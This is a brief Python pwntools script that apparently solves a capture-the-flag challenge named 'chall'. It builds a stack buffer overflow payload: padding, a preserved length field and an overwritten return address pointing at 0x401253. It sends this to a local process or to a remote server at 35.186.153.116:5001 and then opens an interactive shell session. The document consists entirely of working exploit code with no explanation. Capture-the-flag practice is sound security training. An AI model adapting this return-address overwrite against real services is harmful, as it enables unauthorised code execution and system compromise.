#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

e = ELF("./chall")
context.binary = e
#context.log_level = 'debug'

if "--tmux" in sys.argv:
	context.terminal = ['tmux','new-window']
else:
	context.terminal = ['terminator','-e']

if "--remote" in sys.argv:
	r = remote('35.186.153.116',5001)
else:
	r = process([e.path])

payload = b"A"*1048+p32(1048)+b"A"*(1080-1048-4)+p64(0x401253)
r.sendline(payload)
r.interactive()